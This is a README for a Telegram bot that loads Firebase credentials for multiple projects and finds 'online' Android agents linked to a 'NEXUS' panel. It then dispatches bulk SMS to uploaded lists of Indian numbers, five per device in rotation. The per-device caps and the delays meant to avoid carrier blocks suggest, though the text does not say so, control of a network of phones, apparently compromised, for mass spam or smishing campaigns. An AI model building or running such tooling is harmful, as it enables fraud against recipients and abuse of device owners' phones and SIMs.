# Multi-User Automatic Telegram → Firebase SMS Bot

Fully automatic multi-project bot:

1. Upload multiple Firebase service-account credentials  
2. Bot scans every project and finds **online** devices (same heuristics as NEXUS panel)  
3. Upload recipient numbers (Indian mobiles)  
4. Send custom SMS text  
5. Bot sends **exactly 5 SMS per online device**, then switches to the next device  
6. Live progress bar → auto-stops when all recipients are processed  

```
Telegram user
    │  (files + message)
    ▼
Python bot (this)
    │  multi firebase_admin apps
    ▼
Firebase RTDB projects  →  devices/{id}/sendSms/{jobId}
    │
    ▼
Online Android agents (SmsManager) → recipient SIMs
```

## Setup

```bash
cd telegram-sms-bot
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt
export TELEGRAM_BOT_TOKEN="123456:ABC..."
python bot.py
```

Optional: restrict users by filling `ALLOWED_USERS` set inside `bot.py`.

## Conversation flow

| Step | User action | Bot action |
|------|-------------|------------|
| 1 | `/start` then send service-account `.json` / `.txt` | Parse all credentials, init named Firebase apps, scan `devices/`, report online count |
| 2 | Send `.txt` of recipient numbers | Parse & normalize Indian numbers (+91…) |
| 3 | Send plain SMS text | Confirm → launch background worker |
| — | — | Worker: 5 SMS / device, round-robin, progress bar edits, stop when queue empty |

Commands while running: `/status` · `/cancel` · `/start` (resets).

## Firebase credential formats accepted

- Single `serviceAccountKey.json`
- `.txt` containing one or more full JSON objects (separated by blank lines)
- JSON array of service-account objects

Each object must contain at least `project_id` + `private_key`.  
If `databaseURL` is missing, bot uses `https://{project_id}-default-rtdb.firebaseio.com`.

## Online detection

Matches NEXUS-NeoBrutal panel:

- `status` / `online` / `isOnline` / `connected` / `alive` truthy
- or `lastSeen` (any common field name) within last **5 minutes**

## Distribution rule

```
for each recipient number:
  pick next online device that has sent < 5 SMS in this campaign
  push job to devices/{deviceId}/sendSms/{jobId}
  status = pending  →  Android agent picks up and sends via SmsManager
```

If recipients > (online_devices × 5), remaining numbers continue round-robin (soft overflow).  
Adjust `SMS_PER_DEVICE` at top of `bot.py` if needed.

## Job shape (same as previous single-device bot)

```
devices/{deviceId}/sendSms/{jobId}/
  to, body, status: "pending", createdAt, requestedBy, sim: 1
```

Android side: use existing `AndroidSmsListener.java` (or NEXUS agent that already listens on `sendSms`).

## Notes

- Each Firebase project becomes a named `firebase_admin` app so many projects can run in one process.
- Progress message is edited every few sends (Telegram rate limits).
- Carrier limits apply; keep `JOB_DELAY_SEC` ≥ 1s to reduce blocks.
- `/start` cleans previous Firebase app instances for that chat.
